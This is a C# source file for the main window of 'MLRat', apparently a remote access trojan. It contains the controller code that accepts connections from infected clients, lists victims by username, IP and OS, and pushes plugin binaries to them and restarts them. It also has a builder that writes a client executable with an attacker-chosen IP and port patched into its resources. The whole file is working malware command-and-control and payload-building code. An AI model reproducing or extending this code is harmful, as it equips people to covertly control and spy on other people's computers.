using MLRat.Plugin;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using MLRat.Networking;
using System.Diagnostics;
using MLRat.Cryptography;
using MLRat.Server;
using System.Threading;
using MLRat.Handlers;
using ServerPlugin.InterfaceHandle;
using System.Runtime.InteropServices;
using MLRat.Properties;

namespace MLRat.Forms
{
    public partial class MainWindow : Form
    {
        private eSock.Server NetworkServer;
        private Dictionary<Guid, MLPlugin> LoadedPlugins = new Dictionary<Guid, MLPlugin>();
        //private HashSet<Guid> ClientID = new HashSet<Guid>();
        private Dictionary<Guid, MLClientData> ConnectedClients = new Dictionary<Guid, MLClientData>();
        public MainWindow()
        {
            InitializeComponent();
        }

        private Guid GetUniqueID()
        {
            Guid id = Guid.NewGuid();
            while(ConnectedClients.ContainsKey(id))
                id = Guid.NewGuid();
            return id;
        }


        void DisplayException(MLPlugin plugin, Exception ex)
        {
            if (plugin != null && plugin.PluginInfomation != null)
            {
                rtbPluginLog.LogText(string.Format("[{0}] {1}", plugin.ServerPlugin, ex.Message), Color.Red);
                //Console.WriteLine("{0}: {1}", plugin.ClientPluginID, ex.ToString());
            }
            else
            {
                rtbPluginLog.LogText(ex.Message, Color.Red);
            }
        }

        void LoadPlugin(string path)
        {
            MLPlugin _plugin = null;
            try
            {
                byte[] PluginBytes = File.ReadAllBytes(path);
                _plugin = new MLPlugin(PluginBytes);
                if (!_plugin.Load())
                    throw new Exception("Failed to load plugin");
                if (_plugin.ClientPluginID == Guid.Empty)
                    throw new Exception("Invalid plugin ID");
                if (LoadedPlugins.ContainsKey(_plugin.ClientPluginID))
                    throw new Exception("Client plugin ID match");
                pluginDisplay _display = new pluginDisplay(_plugin);
                _display.Parent = pluginPanel;
                _display.Width = pluginPanel.Width;
                _display.Anchor = AnchorStyles.Left | AnchorStyles.Right | AnchorStyles.Top;
                _display.Location = new Point(0, LoadedPlugins.Count*_display.Height);
                pluginPanel.Controls.Add(_display);
                LoadedPlugins.Add(_plugin.ClientPluginID, _plugin);
                Console.WriteLine("Loaded plugin: {0}", _plugin.ClientPluginID.ToString("n"));
                _plugin.ServerPlugin.OnPluginLoad(new MLUiHost(_plugin, OncontextAdd, OnColumnAdd, getImage, LogText));
            }
            catch(Exception ex)
            {
                DisplayException(_plugin, ex);
            }
        }

        void LogText(MLPlugin plugin, string text, Color c)
        {
            try
            {
                rtbPluginLog.LogText(string.Format("[{0}] ", plugin.PluginInfomation.PluginName) + text, c);
            }
            catch(Exception ex)
            {
                DisplayException(plugin, ex);
            }
        }

        IMLRatColumn OnColumnAdd(MLPlugin _plugin, string name, string defaultValue)
        {
            lock(this)
            {
                MLRatColumn column = new MLRatColumn(OnColumnUpdate);
                column.Parent = _plugin;
                ColumnHeader header = clientList.Columns.Add(name);
                column.Index = header.Index;
                header.Tag = defaultValue;
                
                Invoke((MethodInvoker)delegate ()
                {
                    foreach (ListViewItem clientItem in clientList.Items)
                    {
                        foreach (ColumnHeader cheader in clientList.Columns)
                        {
                            if (clientItem.SubItems.Count == header.Index)
                            {
                                clientItem.SubItems.Add((string)header.Tag);
                            }
                        }
                    }
                });
               
                Console.WriteLine("Added column: {0}", name);
                return column;
            }
        }

        void OnColumnUpdate(MLRatColumn sender, MLPlugin plugin, IClient client, string value)
        {
            try
            {
                MLClientData d = ConnectedClients[client.ID];
                ListViewItem i = (ListViewItem)d.DisplayObject;
                EditSubitem(i, sender.Index, value);
            }
            catch(Exception ex)
            {
                DisplayException(plugin, ex);
            }
        }

        void EditSubitem(ListViewItem i, int index, string value)
        {
            Invoke((MethodInvoker)delegate ()
            {
                if (index < clientList.Columns.Count)
                {
                    i.SubItems[index].Text = value;
                }
                
            });
        }

        Image getImage(string name)
        {
            try
            {
                string imgPath = Path.Combine("Images", name);
                if (!File.Exists(imgPath))
                    return null;
                return Image.FromFile(imgPath);
            }
            catch
            {
                return null;
            }
        }

        void OncontextAdd(MLPlugin _plugin, MLRatContextEntry[] entry)
        {
            foreach(MLRatContextEntry contextentry in entry)
            {
                AddSingleContext(_plugin, contextentry);
            }
        }

        void AddSingleContext(MLPlugin _plugin, MLRatContextEntry entry)
        {
            ToolStripMenuItem _baseItem = new ToolStripMenuItem();
            Image toolstripIcon = getImage(entry.Icon);
            if (toolstripIcon != null)
                _baseItem.Image = toolstripIcon;
            _baseItem.Text = entry.Text;
            _baseItem.Tag = new MLContextData()
            {
                Plugin = _plugin,
                ContextData = entry
            };
            if (entry.OnClick != null)
                _baseItem.Click += ContextMenu_Click;
            if (entry.SubMenus != null)
            {
                foreach (var subentry in entry.SubMenus)
                    AddMenuItem(_plugin, _baseItem, subentry);
            }
            ClientContextStrip.Items.Add(_baseItem);
        }

        void AddMenuItem(MLPlugin _plugin, ToolStripMenuItem parent, MLRatContextEntry entry)
        {
            ToolStripMenuItem _menu = new ToolStripMenuItem();
            Image toolstripIcon = getImage(entry.Icon);
            if (toolstripIcon != null)
                _menu.Image = toolstripIcon;
            _menu.Text = entry.Text;
            _menu.Tag = new MLContextData()
            {
                Plugin = _plugin,
                ContextData = entry
            };
            if (entry.OnClick != null)
                _menu.Click += ContextMenu_Click;
            if (entry.SubMenus != null)
            {
                foreach (var subentrys in entry.SubMenus)
                    AddMenuItem(_plugin, _menu, subentrys);
            }
            parent.DropDownItems.Add(_menu);
        }

        void ContextMenu_Click(object sender, EventArgs e)
        {
            MLPlugin plugin = null;
            try
            {
                ToolStripMenuItem _menu = (ToolStripMenuItem) sender;
                MLContextData _entry = (MLContextData)_menu.Tag;
                plugin = _entry.Plugin;
                _entry.ContextData.OnClick(SelectedClients(plugin));
            }
            catch(Exception ex)
            {
                DisplayException(plugin, ex);
            }
        }

        IClient[] SelectedClients(MLPlugin _plugin)
        {
            List<IClient> _selectedClients = new List<IClient>();
            foreach (ListViewItem i in clientList.SelectedItems)
            {
                try
                {
                    this.Invoke((MethodInvoker) delegate()
                    {
                        MLClientData _client = (MLClientData) i.Tag;
                        _selectedClients.Add(new MLClient(_client.ID, _plugin.ClientPluginID, _client));
                    });
                }
                catch(Exception ex)
                {
                    DisplayException(_plugin, ex);
                }
            }
            return _selectedClients.ToArray();
        }

        private void MainWindow_Load(object sender, EventArgs e)
        {
            this.Text += " - " + Application.ProductVersion;
            DirectoryInfo id = new DirectoryInfo("Plugins");
            if (id.Exists)
            {
                foreach (FileInfo pluginFile in id.GetFiles("*.MLP"))
                {
                    LoadPlugin(pluginFile.FullName);
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            NetworkServer = new eSock.Server();
            NetworkServer.BufferSize = 8192;
            NetworkServer.OnClientConnect += NetworkServer_OnClientConnect;
            NetworkServer.OnClientConnecting += NetworkServer_OnClientConnecting;
            NetworkServer.OnClientDisconnect += NetworkServer_OnClientDisconnect;
            NetworkServer.OnDataRetrieved += NetworkServer_OnDataRetrieved;
            if (NetworkServer.Start((int)numericUpDown1.Value))
            {
                this.Text += ": " + numericUpDown1.Value.ToString();
                gbNetwork.Enabled = false;
            }
            else
            {
                MessageBox.Show("Failed to listen");
            }
        }

        #region " Network callbacks "

        void NetworkServer_OnDataRetrieved(eSock.Server sender, eSock.Server.eSockClient client, object[] data)
        {
            lock (client)
            {
                try
                {
                    MLClientData _ClientData = (MLClientData) client.Tag;
                    Guid PluginID = (Guid) data[0];
                    if (PluginID == Guid.Empty)
                    {
                        NetworkPacket command = (NetworkPacket)data[1];
                        Debug.WriteLine(command, "Command");
                        if (!_ClientData.Handshaken)
                        {
                            
                            if (command == NetworkPacket.Handshake)
                            {
                                _ClientData.Handshaken = true;
                                _ClientData.Encryption.GenerateRandomKey();
                                client.Send(Guid.Empty, (byte)NetworkPacket.Connect, _ClientData.Encryption.Key);
                                _ClientData.Encryption.Enabled = true;
                                return;
                            }
                            return;
                        }

                        if(command == NetworkPacket.BasicSettingsUpdated)
                        {
                            Debug.WriteLine("Basic settings updated", "Settings");
                            ListViewItem i = new ListViewItem(_ClientData.Settings.GetSetting<string>("Username", "Default"));
                            i.Tag = _ClientData;

                            i.SubItems.Add(client.NetworkSocket.RemoteEndPoint.ToString());
                            i.SubItems.Add(_ClientData.Settings.GetSetting<string>("OS", "WinX Lollypop (Unknowen)"));
                            i.SubItems.Add(_ClientData.Settings.GetSetting<string>("Cores", "0"));
                            _ClientData.DisplayObject = i;
                            
                            AddListview(i);
                            foreach (var plugin in LoadedPlugins)
                            {
                                try
                                {
                                    plugin.Value.ServerPlugin.OnClientConnect(new MLClient(_ClientData.ID, plugin.Value.ClientPluginID, _ClientData));
                                }
                                catch (Exception ex)
                                {
                                    DisplayException(plugin.Value, ex);
                                }
                            }
                        }

                        if(command == NetworkPacket.UpdateSetting)
                        {
                            string settingName = (string)data[2];
                            object value = data[3];
                            _ClientData.Settings.UpdateSetting(settingName, value);
                            Debug.WriteLine(string.Format("Updated {0}", settingName), "Settings");
                        }

                        if(command == NetworkPacket.UpdateSettingsDictionary)
                        {
                            var settings = (Dictionary< string, object>)data[2];
                            foreach(var dcItem in settings)
                            {
                                _ClientData.Settings.UpdateSetting(dcItem.Key, dcItem.Value);
                            }
                        }


                        #region " Plugin Checksum "
                        
                        if (command == NetworkPacket.Checksums)
                        {
                            bool Updated = false;
                            Dictionary<Guid, string> Checksums = (Dictionary<Guid, string>)data[2];
                            if (Checksums == null)
                            {
                                foreach (var plugin in LoadedPlugins)
                                {
                                    Guid ID = plugin.Key;
                                    UpdatePlugin(client, ID);
                                    Thread.Sleep(100);
                                    Updated = true;
                                }
                                return;
                            }
                            foreach (var plugin in Checksums)
                            {
                                Guid ID = plugin.Key;
                                string checksum = plugin.Value;
                                if (!LoadedPlugins.ContainsKey(ID))
                                {
                                    client.Send(Guid.Empty, (byte)NetworkPacket.DeletePlugin, ID);
                                    Updated = true;
                                    continue;
                                }
                                if (LoadedPlugins[ID].ClientPluginChecksum!= checksum)
                                {
                                    UpdatePlugin(client, ID);
                                    Thread.Sleep(100);
                                    Updated = true;
                                }
                                 
                            }

                            foreach (var plugin in LoadedPlugins)
                            {
                                Guid ID = plugin.Key;
                                MLPlugin PluginData = plugin.Value;
                                if (!Checksums.ContainsKey(ID))
                                {
                                    UpdatePlugin(client, ID);
                                    Thread.Sleep(100);
                                    Updated = true;
                                }
                            }
                            if (Updated)
                                client.Send(Guid.Empty, (byte)NetworkPacket.Restart);
                            else
                                client.Send(Guid.Empty, (byte)NetworkPacket.PluginsVerified);
                            _ClientData.PluginsVerified = true;
                            
                        }

                        #endregion

                        return;
                    }
                    if (LoadedPlugins.ContainsKey(PluginID))
                    {
                        LoadedPlugins[PluginID].ServerPlugin.OnDataRetrieved(new MLClient(_ClientData.ID, PluginID,
                            _ClientData), (object[]) data[1]);
                    }
                }
                catch(Exception ex)
                {
                    DisplayException(null, ex);
                }
            }
        }

        void NetworkServer_OnClientDisconnect(eSock.Server sender, eSock.Server.eSockClient client, System.Net.Sockets.SocketError ER)
        {
            MLClientData _ClientData = (MLClientData)client.Tag;
            RemoveListView((ListViewItem)_ClientData.DisplayObject);
            if (ConnectedClients.ContainsKey(_ClientData.ID))
                ConnectedClients.Remove(_ClientData.ID);
            foreach (var plugin in LoadedPlugins)
            {
                try
                {
                    plugin.Value.ServerPlugin.OnClientDisconnect(new MLClient(_ClientData.ID,
                        plugin.Value.ClientPluginID,
                        _ClientData));
                }
                catch(Exception ex)
                {
                    DisplayException(plugin.Value, ex);
                }
            }
        }

        bool NetworkServer_OnClientConnecting(eSock.Server sender, System.Net.Sockets.Socket cSock)
        {
            return true;
        }

        void NetworkServer_OnClientConnect(eSock.Server sender, eSock.Server.eSockClient client)
        {
            MLClientData _ClientData = new MLClientData(GetUniqueID(), client);
            ConnectedClients.Add(_ClientData.ID, _ClientData);
            client.Tag = _ClientData;
        }

        #endregion

        void UpdatePlugin(eSock.Server.eSockClient client, Guid ID)
        {
            try
            {
                byte[] buffer = new byte[2000];
                int bytesRead = 0;
                using (MemoryStream _pluginUpdate = new MemoryStream(LoadedPlugins[ID].ClientPluginBytes))
                {
                    while ((bytesRead = _pluginUpdate.Read(buffer, 0, buffer.Length)) > 0)
                    {
                        byte[] Packet = new byte[bytesRead];
                        Array.Copy(buffer, 0, Packet, 0, bytesRead);
                        client.Send(Guid.Empty, (byte)NetworkPacket.UpdatePlugin, ID, Packet,
                        _pluginUpdate.Position == _pluginUpdate.Length);
                        Thread.Sleep(100);
                    }
                }
            }
            catch (Exception ex)
            {
                if (LoadedPlugins.ContainsKey(ID))
                    DisplayException(LoadedPlugins[ID], ex);
                else
                    DisplayException(null, ex);
            }
        }

        void AddListview(ListViewItem lv)
        {
            this.Invoke((MethodInvoker)delegate ()
            {
                foreach (ColumnHeader header in clientList.Columns)
                {
                    if (lv.SubItems.Count == header.Index)
                    {
                        lv.SubItems.Add((string)header.Tag);
                    }
                }
                clientList.Items.Add(lv);
            });
        }
        void RemoveListView(ListViewItem lv)
        {
            this.Invoke((MethodInvoker)delegate ()
            {
                if (clientList != null)
                    clientList.Items.Remove(lv);
            });
        }

        #region " WinApi "

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr BeginUpdateResource(string pFileName,
       [MarshalAs(UnmanagedType.Bool)]bool bDeleteExistingResources);
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool UpdateResource(IntPtr hUpdate, string lpType, string lpName, ushort wLanguage, IntPtr lpData, uint cbData);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool EndUpdateResource(IntPtr hUpdate, bool fDiscard);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool DeleteFile(string path);

        #endregion

        private void button2_Click(object sender, EventArgs e)
        {
            string outputFile = string.Empty;
            try
            {
                using (SaveFileDialog sfd = new SaveFileDialog())
                {
                    sfd.Filter = "Exe File|*.exe";
                    if (sfd.ShowDialog() != DialogResult.OK)
                        return;
                    outputFile = sfd.FileName;
                }
                File.WriteAllBytes(outputFile, Resources.MLRatClient);
                IntPtr resourcePointer = BeginUpdateResource(outputFile, false);
                byte[] resource = null;
                using (MemoryStream ms = new MemoryStream())
                using (BinaryWriter br = new BinaryWriter(ms))
                {
                    br.Write((int)nudPortBuild.Value);
                    br.Write(tbIPBuild.Text);
                    resource = ms.ToArray();
                }
                //GCHandle handle = GCHandle.Alloc(resource, GCHandleType.Pinned);
                IntPtr handle = Marshal.AllocHGlobal(resource.Length);
                try
                {
                    Marshal.Copy(resource, 0, handle, resource.Length);
                    if (!UpdateResource(resourcePointer, "RT_RCDATA", "Settings", 0, handle/*handle.AddrOfPinnedObject()*/, Convert.ToUInt32(resource.Length)))
                        throw new Exception();
                    if (!EndUpdateResource(resourcePointer, false))
                        throw new Exception();
                }
                finally
                {
                    Marshal.Release(handle);
                }
               
                //handle.Free();
                MessageBox.Show("Built!");
            }
            catch
            {
                DeleteFile(outputFile);
                MessageBox.Show("Failed");
            }
        }
    }

    public static class RichTextBoxExtensions
    {
        public static void LogText(this RichTextBox box, string text, Color color)
        {
            box.Invoke((MethodInvoker)delegate ()
            {
                box.SelectionStart = box.TextLength;
                box.SelectionLength = 0;

                box.SelectionColor = color;
                box.AppendText(text + "\n");
                box.SelectionColor = box.ForeColor;
                box.SelectionStart = box.Text.Length;
                box.ScrollToCaret();
            });
        }
    }
}
